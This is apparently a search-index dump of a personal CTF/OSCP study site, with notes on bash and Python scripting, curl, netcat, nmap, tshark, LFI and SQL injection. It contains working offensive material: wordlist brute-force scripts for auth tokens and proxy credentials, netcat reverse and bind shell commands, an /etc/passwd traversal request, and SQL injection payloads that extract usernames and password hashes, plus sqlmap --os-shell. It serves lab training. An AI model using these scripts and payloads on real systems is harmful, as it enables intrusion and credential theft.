ScriptsBashUseful ScriptsSystem CommandsBasic Bash Commands and Constructs","url":"docs/hunting/scripts/bash_scripts#undefined","content":"# Format # sed 's/regexp/replace/g' filename.txt sed 's/,/ /g' filename.txt # replaces all comma with space sed 's/\\//g' filename.txt # remove / from filename.txt  "},{"title":"awk","type":1,"pageTitle":"Bash ScriptsBashUseful ScriptsSystem CommandsBasic Bash Commands and Constructs","url":"docs/hunting/scripts/bash_scripts#undefined","content":"awk -F: '{print $1} creds # prints first coulumn of file creds which contains : separated values awk -F, '{print $1} creds # prints first coulumn of file creds which contains , separated values  Useful Scripts "},{"title":"Authorization Token","type":1,"pageTitle":"Bash ScriptsBashUseful ScriptsSystem CommandsBasic Bash Commands and Constructs","url":"docs/hunting/scripts/bash_scripts#undefined","content":"Bash script to read different tokens from a file and pass them to curl command to find out the valid token for authorization. To read file line by line in a while loop you can refer Read file line by line #!/bin/bash while read token; do content=$(curl -s -H 'Authorization: Token '\"$token\" $1) if echo \"$content\" | grep -qi \"unauth\"; then continue else echo \"Found token : $token\" fi done <$2  output ./brute.sh 192.186.248.3 wordlists/100-common-passwords.txt  "},{"title":"Directory Listing","type":1,"pageTitle":"Bash ScriptsBashUseful ScriptsSystem CommandsBasic Bash Commands and Constructs","url":"docs/hunting/scripts/bash_scripts#undefined","content":"#!/bin/bash while read dir_name; do echo \"Trying directory: $dir_name\" curl http://$1$dir_name done <$2  output ./testscript.sh 192.11.183.3 directory.txt  "},{"title":"proxy authentication dictionary attk","type":1,"pageTitle":"Bash ScriptsBashUseful ScriptsSystem CommandsBasic Bash Commands and Constructs","url":"docs/hunting/scripts/bash_scripts#undefined","content":"#!/bin/bash while read user do while read passwd do content=$(curl -I -x \"$user\":\"$passwd\"@$1 $2) echo \"$user - $passwd\" if echo \"$content\" | grep -qi \"407 proxy authentication required\"; then continue else echo \"Found usernam-pwd : $user - $passwd\" exit 0 fi done <$4 done <$3  $ ./crack.py 192.144.18.3:3128 127.0.0.1 usernames.lst password.lst  System Commands "},{"title":"find","type":1,"pageTitle":"Bash ScriptsBashUseful ScriptsSystem CommandsBasic Bash Commands and Constructs","url":"docs/hunting/scripts/bash_scripts#undefined","content":"find / -type f -name '*.txt' find / -type f -perm 775 -user student  "},{"title":"locate","type":1,"pageTitle":"Bash ScriptsBashUseful ScriptsSystem CommandsBasic Bash Commands and Constructs","url":"docs/hunting/scripts/bash_scripts#undefined","content":"# -i option to perform a case-insensitive search locate wordlist  "},{"title":"netstat","type":1,"pageTitle":"Bash ScriptsBashUseful ScriptsSystem CommandsBasic Bash Commands and Constructs","url":"docs/hunting/scripts/bash_scripts#undefined","content":"Refs: https://www.binarytides.com/linux-netstat-command-examples/ netstat is a command line utility that can be used to list out all the network (socket) connections on a system. # Enumerate services running on the target machine ps -ef netstat -anlp  # List out all connections netstat -a # List out only tcp connections netstat -at # Disable reverse dns lookup for faster output. By default, the netstat command tries to find out the hostname of each ip address in the # connection by doing a reverse dns lookup. This slows down the output. netstat -n # List out only listening connections netstat -l # Get process name/pid and user id. -p for process name/pid and -e for user # When using the -p option, netstat must be run with root privileges, otherwise it cannot detect the pids of processes running with root # privileges and most services like http and ftp often run with root privileges. sudo netstat -ltpe # All established connections from the server. netstat -natu | grep 'ESTABLISHED' netstat -natu | grep 'ESTABLISHED' | grep 61.177.142.158 # Listening Connection netstat -an | grep 'LISTEN' netstat -tnl  "},{"title":"ps","type":1,"pageTitle":"Bash ScriptsBashUseful ScriptsSystem CommandsBasic Bash Commands and Constructs","url":"docs/hunting/scripts/bash_scripts#undefined","content":"# Display all processes in BSD format ps aux  -a flag stands for all processes -x will display all processes even those not associated with the current tty # To view a full format listing run ps -ef  "},{"title":"empty file","type":1,"pageTitle":"Bash ScriptsBashUseful ScriptsSystem CommandsBasic Bash Commands and Constructs","url":"docs/hunting/scripts/bash_scripts#undefined","content":"# -n tells echo not to output the trailing newline echo -n \"\" > access.log # The truncate command helps to shrink or extend the size of a file to a defined size. # -s option specifies the file size truncate -s 0 access.log  Basic Bash Commands and Constructs Refs : https://www.youtube.com/watch?v=LTuuMtQR1uQ&list=PLBf0hzazHTGMJzHon4YXGscxUvsFpxrZThttps://www.youtube.com/watch?v=aNQCl_ByM20 "},{"title":"Basic Expressions","type":1,"pageTitle":"Bash ScriptsBashUseful ScriptsSystem CommandsBasic Bash Commands and Constructs","url":"docs/hunting/scripts/bash_scripts#undefined","content":"#!/bin/bash # No space is allowed before and after the assignment (i.e. the equal sign) in BASH counter=8 echo \"Double vs Single quote\" echo \"$counter\" # single quote prevents shell expansion to keep text as it is echo '$counter' echo \"Variable Expansion\" echo $counter echo ${counter}th floor echo \"Brace Expansion\" echo T{a,i,o}m echo \"Arithematic Expansion\" echo $[3*2] echo $((3*2)) echo $((counter++)) echo $((counter--)) echo \"Parameter Expansion\" opt=${1:-DEFAULT VALUE} echo $opt  output Double vs Single quote 8 $counter Variable Expansion 8 8th floor Brace Expansion Tam Tim Tom Arithematic Expansion 6 6 8 9 Parameter Expansion DEFAULT VALUE  "},{"title":"If-else","type":1,"pageTitle":"Bash ScriptsBashUseful ScriptsSystem CommandsBasic Bash Commands and Constructs","url":"docs/hunting/scripts/bash_scripts#undefined","content":"#!/bin/bash echo \"Enter your username : \"; read NAME # format 1 # if test-result-is-true; then COMMAND; fi if [ \"$NAME\" = \"Eliot\" ]; then echo \"Welcome back Eliot\"; else echo \"Please register\"; fi function test_func() { return 0 } # format 2 # if function-return-zero; then COMMAND; fi if test_func then echo \"Function returned zero\" else echo \"Non zero return!!!\" fi  output Enter your username : Eliot Welcome back Eliot Function returned zero  "},{"title":"Menu select","type":1,"pageTitle":"Bash ScriptsBashUseful ScriptsSystem CommandsBasic Bash Commands and Constructs","url":"docs/hunting/scripts/bash_scripts#undefined","content":"#!/bin/bash menu=\"Pizza Burger FrenchFries Quit\" select choice in $menu; do [[ $choice == Quit ]] && { echo bye break } # REPLY is a BASH built-in variable for select construct echo \"You selected option $REPLY\" done  output 1) Pizza 2) Burger 3) FrenchFries 4) Quit #? 3 You selected option 3 #? 4 bye  "},{"title":"test Expressions","type":1,"pageTitle":"Bash ScriptsBashUseful ScriptsSystem CommandsBasic Bash Commands and Constructs","url":"docs/hunting/scripts/bash_scripts#undefined","content":"We can make use of conditional expressions in the bash scripting. In order to know the available expressions use $ help test test: test [expr] Evaluate conditional expression. Exits with a status of 0 (true) or 1 (false) depending on the evaluation of EXPR. -d FILE True if file is a directory. -e FILE True if file exists.  "},{"title":"for loops","type":1,"pageTitle":"Bash ScriptsBashUseful ScriptsSystem CommandsBasic Bash Commands and Constructs","url":"docs/hunting/scripts/bash_scripts#undefined","content":"#!/bin/bash for((i = 1, j = 10; i <= 3 && j <= 20; i++, j += 10)); do echo $i $j; done  output 1 10 2 20  "},{"title":"for-in-loops","type":1,"pageTitle":"Bash ScriptsBashUseful ScriptsSystem CommandsBasic Bash Commands and Constructs","url":"docs/hunting/scripts/bash_scripts#undefined","content":"#!/bin/bash for NAME in $(cat names.txt); do echo \"Name is : $NAME\" done  output Name is : ram Name is : shayam Name is : sita  #!/bin/bash echo \"Please enter the subnet : \" read SUBNET for IP in $(seq 1 254); do ping -c 1 $SUBNET.$IP done  output Please enter the subnet : 192.234.246 PING 192.234.246.1 (192.234.246.1) 56(84) bytes of data. 64 bytes from 192.234.246.1: icmp_seq=1 ttl=64 time=0.079 ms  "},{"title":"Functions","type":1,"pageTitle":"Bash ScriptsBashUseful ScriptsSystem CommandsBasic Bash Commands and Constructs","url":"docs/hunting/scripts/bash_scripts#undefined","content":""},{"title":"Read file line by line","type":1,"pageTitle":"Bash ScriptsBashUseful ScriptsSystem CommandsBasic Bash Commands and Constructs","url":"docs/hunting/scripts/bash_scripts#undefined","content":"Refs: https://www.cyberciti.biz/faq/unix-howto-read-line-by-line-from-file/ while read -r line; do COMMAND; done < input.file The -r option passed to read command prevents backslash escapes from being interpreted. Add IFS= option before read command to prevent leading/trailing whitespace from being trimmed. while IFS= read -r line; do COMMAND $line; done < input.file #!/bin/bash input=\"/path/to/txt/file\" while IFS= read -r line do echo \"$line\" done < \"$input\"  "},{"title":"Use of test expression in if-else","type":1,"pageTitle":"Bash ScriptsBashUseful ScriptsSystem CommandsBasic Bash Commands and Constructs","url":"docs/hunting/scripts/bash_scripts#undefined","content":"#!/bin/bash if [ -e /etc/shadow ]; then echo \"File exists\"; else echo \"Missing...\"; fi  "},{"title":"Arguments","type":1,"pageTitle":"Bash ScriptsBashUseful ScriptsSystem CommandsBasic Bash Commands and Constructs","url":"docs/hunting/scripts/bash_scripts#undefined","content":"#!/bin/bash function show_arguments() { #define a function echo $@ # all arguments echo $* # all arguments echo $1 $2 # first and second arguments } show_arguments 1 \"a b c\" 3  output 1 a b c 3 1 a b c 3 1 a b c  "},{"title":"Local Variables","type":1,"pageTitle":"Bash ScriptsBashUseful ScriptsSystem CommandsBasic Bash Commands and Constructs","url":"docs/hunting/scripts/bash_scripts#undefined","content":"#!/bin/bash counter=4 function check() { #define a function local counter=8 echo $counter } check echo $counter  output 8 4  "},{"title":"Exit codes","type":1,"pageTitle":"Bash ScriptsBashUseful ScriptsSystem CommandsBasic Bash Commands and Constructs","url":"docs/hunting/scripts/bash_scripts#undefined","content":"#!/bin/bash function func() { #define a function return $1 } func 5 (($? != 0)) && { echo \"Error M1\"; } # Method 1 if ! func 5; then echo \"Error M2\"; fi # Method 2  output Error M1 Error M2  "},{"title":"Python Scripts","type":0,"sectionRef":"#","url":"docs/hunting/scripts/python_scripts","content":""},{"title":"Run shell programs by reading command line arguments","type":1,"pageTitle":"Python Scripts","url":"docs/hunting/scripts/python_scripts#undefined","content":"This script reads different tokens from a file and pass them to curl command to find out the valid token for authorization import subprocess import argparse def crack(filename, ip_addr) : with open(filename) as f: password_list = f.readlines() # to remove whitespace characters like `\\n` at the end of each line password_list = [x.strip() for x in password_list] print(password_list) for password in password_list : comd = \"curl -s -H 'Authorization: Token \" + password + \"' \" + ip_addr print(\"Trying...\" + password) output = subprocess.run(comd, capture_output=True, shell=True).stdout.decode('utf-8') if \"Unauth\".lower() in output.lower(): print(\"Unauth\".lower()+\"-->\" + output.lower()) continue else : print(\"Found : \" + password) break if __name__ == \"__main__\": parser = argparse.ArgumentParser() parser.add_argument(\"filename\", help=\"Enter the filename containing passwords\") parser.add_argument(\"ip_addr\", help=\"Enter the IP address of server including http://\") args = parser.parse_args() crack(args.filename, args.ip_addr)  Output $ python3 crack.py /root/wordlists/100-common-passwords.txt http://192.107.107.3 Trying...damian unauth-->unauthorized access Trying...123123123 Found : 123123123  "},{"title":"curlHTTP AuthenticationPerform an HTTP GET requestHTTP response headersPerform an HTTP POST requestPerform an HTTP POST request sending JSONPerform an HTTP PUT requestFollow a redirectStore the response to a fileSet a different User AgentInspecting all the details of the request and the responseproxy","type":0,"sectionRef":"#","url":"docs/hunting/utilities/curl","content":""},{"title":"HTTP basic authentication","type":1,"pageTitle":"curlHTTP AuthenticationPerform an HTTP GET requestHTTP response headersPerform an HTTP POST requestPerform an HTTP POST request sending JSONPerform an HTTP PUT requestFollow a redirectStore the response to a fileSet a different User AgentInspecting all the details of the request and the responseproxy","url":"docs/hunting/utilities/curl#undefined","content":"If a resource requires Basic HTTP Authentication, you can use the u option to pass the user:password values: curl -u user:pass https://flaviocopes.com/ curl -u bob:qwerty http://192.165.34.3/dir/  "},{"title":"Digest Authentication","type":1,"pageTitle":"curlHTTP AuthenticationPerform an HTTP GET requestHTTP response headersPerform an HTTP POST requestPerform an HTTP POST request sending JSONPerform an HTTP PUT requestFollow a redirectStore the response to a fileSet a different User AgentInspecting all the details of the request and the responseproxy","url":"docs/hunting/utilities/curl#undefined","content":"curl --digest -u alice:password1 http://192.165.34.3/poc/  "},{"title":"Token Authentication","type":1,"pageTitle":"curlHTTP AuthenticationPerform an HTTP GET requestHTTP response headersPerform an HTTP POST requestPerform an HTTP POST request sending JSONPerform an HTTP PUT requestFollow a redirectStore the response to a fileSet a different User AgentInspecting all the details of the request and the responseproxy","url":"docs/hunting/utilities/curl#undefined","content":"We have to set the token in headers for token authentication to work. curl -H 'Authorization: Token <token>' 192.183.171.3  We have to write a custom wrapper around this command. In the script, we will rely on the fact that on using the correct token, we will get something else than \"Unauthorized Access\". You can refer this script https://github.com/jai-the-seeker/CTF-OSCP/blob/master/scripts.md#authorization-token After performing the dictionary attack we will get the password, which can be used to set the token in the headers # -H, --header <header/@file> Pass custom header(s) to server curl -H 'Authorization: Token 123123123' 192.186.248.3  Perform an HTTP GET request When you perform a request, curl will return the body of the response: curl https://flaviocopes.com/  HTTP response headers "},{"title":"response headers i","type":1,"pageTitle":"curlHTTP AuthenticationPerform an HTTP GET requestHTTP response headersPerform an HTTP POST requestPerform an HTTP POST request sending JSONPerform an HTTP PUT requestFollow a redirectStore the response to a fileSet a different User AgentInspecting all the details of the request and the responseproxy","url":"docs/hunting/utilities/curl#undefined","content":"By default the response headers are hidden in the output of curl. To show them, use the i option: curl -i https://flaviocopes.com/  "},{"title":"Only response headers I","type":1,"pageTitle":"curlHTTP AuthenticationPerform an HTTP GET requestHTTP response headersPerform an HTTP POST requestPerform an HTTP POST request sending JSONPerform an HTTP PUT requestFollow a redirectStore the response to a fileSet a different User AgentInspecting all the details of the request and the responseproxy","url":"docs/hunting/utilities/curl#undefined","content":"Using the I option, you can get only the headers, and not the response body: curl -I https://flaviocopes.com/  Perform an HTTP POST request The X option lets you change the HTTP method used. By default, GET is used, and it’s the same as writing curl -X GET https://flaviocopes.com/  Using -X POST will perform a POST request. You can perform a POST request passing data URL encoded: curl -d \"option=value&something=anothervalue\" -X POST https://flaviocopes.com/  In this case, the application/x-www-form-urlencoded Content-Type is sent. Perform an HTTP POST request sending JSON Instead of posting data URL-encoded, like in the example above, you might want to send JSON. In this case you need to explicitly set the Content-Type header, by using the H option: curl -d '{\"option\": \"value\", \"something\": \"anothervalue\"}' -H \"Content-Type: application/json\" -X POST https://flaviocopes.com/  You can also send a JSON file from your disk: curl -d \"@my-file.json\" -X POST https://flaviocopes.com/  Perform an HTTP PUT request The concept is the same as for POST requests, just change the HTTP method using -X PUT Follow a redirect A redirect response like 301, which specifies the Location response header, can be automatically followed by specifying the L option: curl http://flaviocopes.com/  will not follow automatically to the HTTPS version which I set up to redirect to, but this will: curl -L http://flaviocopes.com/  Store the response to a file Using the o option you can tell curl to save the response to a file: curl -o file.html https://flaviocopes.com/  You can also just save a file by its name on the server, using the O option: curl -O https://flaviocopes.com/index.html  Set a different User Agent The user agent tells the server which client is performing the request. By default curl sends the curl/<version> user agent, like: curl/7.54.0. You can specify a different user agent using the --user-agent option: curl --user-agent \"my-user-agent\" https://flaviocopes.com  Inspecting all the details of the request and the response Use the --verbose option to make curl output all the details of the request, and the response: curl --verbose -I https://flaviocopes.com/  proxy -x, --proxy [protocol://]host[:port] curl -x 192.201.208.3:3128 127.0.0.1  The proxy string can be specified with a protocol:// prefix. No protocol specified or http:// will be treated as HTTP proxy. Use socks4://, socks4a://, socks5:// or socks5h:// to request a specific SOCKS version to be used. "},{"title":"username and password for proxy","type":1,"pageTitle":"curlHTTP AuthenticationPerform an HTTP GET requestHTTP response headersPerform an HTTP POST requestPerform an HTTP POST request sending JSONPerform an HTTP PUT requestFollow a redirectStore the response to a fileSet a different User AgentInspecting all the details of the request and the responseproxy","url":"docs/hunting/utilities/curl#undefined","content":"In order to pass the credentials to the proxy server, we can use the curl option -U. Therefore, the following command will work: curl -U admin:laurie -x 192.173.117.3:3128 127.0.0.1:1996  Alternatively, # curl -x <[protocol://][user:password@]proxyhost[:port]> url # Example 1 curl -x http://user:password@proxy-IP-here:port url-of-website:port # Example 2 curl -x admin:laurie@192.142.49.3:3128 127.0.0.1:1996  "},{"title":"username and password for HTTP server","type":1,"pageTitle":"curlHTTP AuthenticationPerform an HTTP GET requestHTTP response headersPerform an HTTP POST requestPerform an HTTP POST request sending JSONPerform an HTTP PUT requestFollow a redirectStore the response to a fileSet a different User AgentInspecting all the details of the request and the responseproxy","url":"docs/hunting/utilities/curl#undefined","content":"# Get a file from an HTTP server that requires user and password, using the proxy: curl -u user:passwd -x my-proxy:888 http://www.get.this/  The curl -u option is used to specify credentials for the target server authentication and not for the proxy server authentication. For e.g, when you are using the command curl -u admin:laurie -x 192.173.117.3:3128 127.0.0.1:1996. The credentials admin:laurie are not being passed as credentials to the proxy server, instead, they are passed as a part of the request which is supposed to be forwarded to the target server. The option value will be considered as credentials for the target server authentication and not for the proxy authentication. The above command will work in the scenario where the proxy server is configured without authentication, but the target server is protected with authentication (basic/digest authentication). This way, the connection will be forwarded by the proxy server and the credentials will be used to authenticate with the target server. "},{"title":"ncNetcat","type":0,"sectionRef":"#","url":"docs/hunting/utilities/nc","content":""},{"title":"banner grabbing","type":1,"pageTitle":"ncNetcat","url":"docs/hunting/utilities/nc#undefined","content":"# ssh netcat 192.251.124.3 22 # SMTP netcat 192.251.124.3 25 # HTTP netcat 192.251.124.3 25 GET / HTTP/1.1  "},{"title":"listener","type":1,"pageTitle":"ncNetcat","url":"docs/hunting/utilities/nc#undefined","content":"netcat -l -p 6789  "},{"title":"transfer file","type":1,"pageTitle":"ncNetcat","url":"docs/hunting/utilities/nc#undefined","content":"# sender netcat <receiver_ip_addr> 6789 < send_file # receiver netcat -l -p 6789 > recv_file  "},{"title":"port scanning","type":1,"pageTitle":"ncNetcat","url":"docs/hunting/utilities/nc#undefined","content":"netcat -v -w1 -z <target_ip> <port_range>  -v : verbose -w1 : wait for 1 sec before timeout -z : No I/O "},{"title":"executing program","type":1,"pageTitle":"ncNetcat","url":"docs/hunting/utilities/nc#undefined","content":"The program can be an executable file (EXE, ELF, etc) or a script (shell, ruby, python etc)Any I/O is redirected to the established socket netcat -e /path/to/executable  "},{"title":"running shell","type":1,"pageTitle":"ncNetcat","url":"docs/hunting/utilities/nc#undefined","content":""},{"title":"relaying","type":1,"pageTitle":"ncNetcat","url":"docs/hunting/utilities/nc#undefined","content":"Refs https://www.youtube.com/watch?v=FLoe9S4TASk "},{"title":"bind shell","type":1,"pageTitle":"ncNetcat","url":"docs/hunting/utilities/nc#undefined","content":"# attacker netcat <victim_ip> 1234 # victim netcat -l -p 1234 -e /bin/bash  "},{"title":"reverse shell","type":1,"pageTitle":"ncNetcat","url":"docs/hunting/utilities/nc#undefined","content":"# attacker netcat -l -p 1234 # victim netcat <attacker_ip> 1234 -e /bin/bash  "},{"title":"server client relay","type":1,"pageTitle":"ncNetcat","url":"docs/hunting/utilities/nc#undefined","content":" ------ ------------- ----- |client|-------------->|server|client|-------------->|server| ------ ------------- ------ Relay Target  # on relay mknod mypipe p netcat -l -p 6789 < mypipe | netcat <target_ip> 80 > mypipe  "},{"title":"nmapscansscripts","type":0,"sectionRef":"#","url":"docs/hunting/utilities/nmap","content":""},{"title":"basic scans","type":1,"pageTitle":"nmapscansscripts","url":"docs/hunting/utilities/nmap#undefined","content":"# version of the running services # -sV: Probe open ports to determine service/version info # -sC: equivalent to --script=default nmap -sV -sC 192.165.34.3 # Alternatively nmap -A 192.165.34.3  scripts "},{"title":"brute","type":1,"pageTitle":"nmapscansscripts","url":"docs/hunting/utilities/nmap#undefined","content":""},{"title":"discovery","type":1,"pageTitle":"nmapscansscripts","url":"docs/hunting/utilities/nmap#undefined","content":""},{"title":"http-proxy-brute","type":1,"pageTitle":"nmapscansscripts","url":"docs/hunting/utilities/nmap#undefined","content":"The http-brute script uses, by default, the database files usernames.lst and passwords.lst located at /nselib/data/ to try each password, for every user nmap --script http-proxy-brute -p3128 192.144.18.3  To use different username and password lists, set the arguments userdb and passdb :  nmap --script http-proxy-brute -p3128 192.144.18.3 --script-args userdb=usernames.lst,passdb=passwords.lst  "},{"title":"banner","type":1,"pageTitle":"nmapscansscripts","url":"docs/hunting/utilities/nmap#undefined","content":"# nmap -sV --script=banner <target> nmap -sV --script=banner -p- 192.162.110.3  "},{"title":"sshSSH Server on Kali Linux","type":0,"sectionRef":"#","url":"docs/hunting/utilities/ssh","content":""},{"title":"Install SSH server","type":1,"pageTitle":"sshSSH Server on Kali Linux","url":"docs/hunting/utilities/ssh#undefined","content":"This step is usually not required in Kali Linux as it comes preinstalled with ssh server. However, if its not installed, you can use sudo apt-get install openssh-server  "},{"title":"Enable root account access from ssh","type":1,"pageTitle":"sshSSH Server on Kali Linux","url":"docs/hunting/utilities/ssh#undefined","content":"By default Kali does not allow root account access from ssh. You need to make following changes in the config file. nano /etc/ssh/sshd_config  Change following in the config file PermitRootLogin yes  Now, start the service and check its status service ssh start service ssh status  "},{"title":"tsharkBasic CommandsDisplay FiltersStatistics","type":0,"sectionRef":"#","url":"docs/hunting/utilities/tshark","content":""},{"title":"WiFi Filters","type":1,"pageTitle":"tsharkBasic CommandsDisplay FiltersStatistics","url":"docs/hunting/utilities/tshark#undefined","content":"# Command to display WPA handshake packets? tshark -r WiFi_traffic.pcap -Y 'eapol'  Statistics -z io,phs[,filter] Create Protocol Hierarchy Statistics listing both number of packets and bytes. If no filter is specified the statistics will be calculated for all packets. If a filter is specified statistics will only be calculated for those packets that match the filter. tshark -r HTTP_traffic.pcap -z io,phs -q  Refs: https://www.wireshark.org/docs/man-pages/tshark.html "},{"title":"DC-9","type":0,"sectionRef":"#","url":"docs/hunting/vulnhub/DC-9","content":""},{"title":"Find IP Address of Machine","type":1,"pageTitle":"DC-9","url":"docs/hunting/vulnhub/DC-9#undefined","content":"Let's find the IP address of the DC-9 machine $ arp-scan --interface=eth1 10.10.10.0/24 Interface: eth1, type: EN10MB, MAC: 08:00:27:5a:bb:1d, IPv4: 10.10.10.106 Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan) 10.10.10.1 0a:00:27:00:00:05 (Unknown: locally administered) 10.10.10.100 08:00:27:6d:d8:39 PCS Systemtechnik GmbH 10.10.10.109 08:00:27:2e:3b:e6 PCS Systemtechnik GmbH  The arp-scan reult shows the IP address of DC-9 machine as 10.10.10.109 "},{"title":"Nmap Scan","type":1,"pageTitle":"DC-9","url":"docs/hunting/vulnhub/DC-9#undefined","content":"Scan the default ports root@kali:~# nmap -sV -sC -oA dc-9.output 10.10.10.109 Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-16 06:59 EDT Nmap scan report for 10.10.10.109 Host is up (0.00017s latency). Not shown: 999 closed ports PORT STATE SERVICE VERSION 22/tcp filtered ssh MAC Address: 08:00:27:2E:3B:E6 (Oracle VirtualBox virtual NIC) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 8.00 seconds  Sleep for sometime and start the port scan for all the ports root@kali:~# sleep 300; nmap -p- -oA dc-9-allports 10.10.10.109  "},{"title":"LFILFI","type":0,"sectionRef":"#","url":"docs/hunting/web/LFI","content":""},{"title":"Fuzz URI parameters","type":1,"pageTitle":"LFILFI","url":"docs/hunting/web/LFI#undefined","content":"https://github.com/jai-the-seeker/CTF-OSCP/blob/master/web/web_recon.md#fuzzing-parameter-for-lfi "},{"title":"Check for LFI","type":1,"pageTitle":"LFILFI","url":"docs/hunting/web/LFI#undefined","content":"Refs https://www.exploit-db.com/papers/12886http://www.securityidiots.com/Web-Pentest/LFI/guide-to-lfi.htmlhttps://highon.coffee/blog/lfi-cheat-sheet/ "},{"title":"Step 1: Directory Traversal","type":1,"pageTitle":"LFILFI","url":"docs/hunting/web/LFI#undefined","content":"In burpsuite, send the intercepted request to repeater mode. Then temper with the arguments of the parameter, to find the LFI vulnerability. In case the vulnerability exists, the contents of /etc/passwd, will show up in the response. In case, there are no parameters being supplied to the URI, the same can be found by fuzzing. In the example below, the parameter file has been found out through fuzzing URI parameters. GET /manage.php?file=../../../../../../../../../../../etc/passwd HTTP/1.1  "},{"title":"SQL InjectionsqlmapINFORMATION_SCHEMAManual Methods","type":0,"sectionRef":"#","url":"docs/hunting/web/sql_injection","content":""},{"title":"GET request","type":1,"pageTitle":"SQL InjectionsqlmapINFORMATION_SCHEMAManual Methods","url":"docs/hunting/web/sql_injection#undefined","content":"sqlmap -u \"http://example.com/?a=1&b=2&c=3\" -p \"a,b\"  "},{"title":"POST request","type":1,"pageTitle":"SQL InjectionsqlmapINFORMATION_SCHEMAManual Methods","url":"docs/hunting/web/sql_injection#undefined","content":"sqlmap -u \"http://example.com/\" --data \"a=1&b=2&c=3\" -p \"a,b\" --method POST  Alternatively, copy the POST request in the intercept of burpsuite in a file and use it as follows $ cat web.txt POST /results.php HTTP/1.1 Host: 10.10.10.109 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://10.10.10.109/search.php Content-Type: application/x-www-form-urlencoded Content-Length: 13 Connection: close Upgrade-Insecure-Requests: 1 search=killer  sqlmap -r web.txt -p \"search\"  "},{"title":"databases","type":1,"pageTitle":"SQL InjectionsqlmapINFORMATION_SCHEMAManual Methods","url":"docs/hunting/web/sql_injection#undefined","content":"sqlmap -u \"http://testphp.vulnweb.com/listproducts.php?cat=1\" --dbs  "},{"title":"tables","type":1,"pageTitle":"SQL InjectionsqlmapINFORMATION_SCHEMAManual Methods","url":"docs/hunting/web/sql_injection#undefined","content":"sqlmap -u \"http://testphp.vulnweb.com/listproducts.php?cat=1\" --tables -D testdb  "},{"title":"data","type":1,"pageTitle":"SQL InjectionsqlmapINFORMATION_SCHEMAManual Methods","url":"docs/hunting/web/sql_injection#undefined","content":"sqlmap -u \"http://testphp.vulnweb.com/listproducts.php?cat=1\" --dump -D testdb -T users  "},{"title":"columns","type":1,"pageTitle":"SQL InjectionsqlmapINFORMATION_SCHEMAManual Methods","url":"docs/hunting/web/sql_injection#undefined","content":"sqlmap -u \"http://testphp.vulnweb.com/listproducts.php?cat=1\" -D testdb -T users --columns  "},{"title":"INFORMATION_SCHEMA Tables","type":1,"pageTitle":"SQL InjectionsqlmapINFORMATION_SCHEMAManual Methods","url":"docs/hunting/web/sql_injection#undefined","content":"https://dev.mysql.com/doc/refman/8.0/en/columns-table.htmlhttps://dev.mysql.com/doc/refman/8.0/en/schemata-table.htmlhttps://dev.mysql.com/doc/refman/8.0/en/st-units-of-measure-table.html Manual Methods "},{"title":"check vulnerability","type":1,"pageTitle":"SQL InjectionsqlmapINFORMATION_SCHEMAManual Methods","url":"docs/hunting/web/sql_injection#undefined","content":"' or 1='1 ' or 1=1;-- ' or 1=1;# ') or ('x'='x ' or like '%';-- ' or 1=1 LIMIT 1;-- USERNAME: ' or 1/* PASSWORD: */ =1 -- USERNAME: admin' or 'a'='a PASSWORD '#  "},{"title":"enumerate fields of search query","type":1,"pageTitle":"SQL InjectionsqlmapINFORMATION_SCHEMAManual Methods","url":"docs/hunting/web/sql_injection#undefined","content":"In burpsuite, go to repeater mode and keep on increasing the numbers till the fields of search query gets printed on the webpage search=killer' UNION SELECT 1,2,3,4,5,6-- -  <h3>Search results </h3> ID: 1<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/>  "},{"title":"enumerate databases","type":1,"pageTitle":"SQL InjectionsqlmapINFORMATION_SCHEMAManual Methods","url":"docs/hunting/web/sql_injection#undefined","content":""},{"title":"enumerate tables","type":1,"pageTitle":"SQL InjectionsqlmapINFORMATION_SCHEMAManual Methods","url":"docs/hunting/web/sql_injection#undefined","content":"search=killer' UNION SELECT GROUP_CONCAT(TABLE_NAME),2,3,4,5,6 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=\"Staff\"-- -  <h3>Search results </h3> ID: StaffDetails,Users<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/>  "},{"title":"enumerate columns","type":1,"pageTitle":"SQL InjectionsqlmapINFORMATION_SCHEMAManual Methods","url":"docs/hunting/web/sql_injection#undefined","content":"search=killer' UNION SELECT GROUP_CONCAT(COLUMN_NAME),2,3,4,5,6 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=\"Staff\" AND TABLE_NAME=\"Users\"-- -  <h3>Search results </h3> ID: UserID,Username,Password<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/>  "},{"title":"show data","type":1,"pageTitle":"SQL InjectionsqlmapINFORMATION_SCHEMAManual Methods","url":"docs/hunting/web/sql_injection#undefined","content":"search=killer' UNION SELECT GROUP_CONCAT(Username,\":\",Password),2,3,4,5,6 FROM Staff.Users-- -  <h3>Search results </h3> ID: admin:856f5de590ef37314e7c3bdf6f8a66dc<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/>  "},{"title":"os shell","type":1,"pageTitle":"SQL InjectionsqlmapINFORMATION_SCHEMAManual Methods","url":"docs/hunting/web/sql_injection#undefined","content":"sqlmap -u \"http://testphp.vulnweb.com/listproducts.php?cat=1\" --os-shell  INFORMATION_SCHEMA Refs: https://www.cmi.ac.in/~madhavan/courses/databases10/mysql-5.0-reference-manual/information-schema.html#schemata-table INFORMATION_SCHEMA provides access to database metadata. Metadata is data about the data, such as the name of a database or table, the data type of a column, or access privileges. INFORMATION_SCHEMA is the information database, the place that stores information about all the other databases that the MySQL server maintains. Inside INFORMATION_SCHEMA there are several read-only tables. They are actually views, not base tables, so there are no files associated with them. "},{"title":"current database","type":1,"pageTitle":"SQL InjectionsqlmapINFORMATION_SCHEMAManual Methods","url":"docs/hunting/web/sql_injection#undefined","content":"search=killer' UNION SELECT database(),2,3,4,5,6-- -  <h3>Search results </h3> ID: Staff<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/>  "},{"title":"using 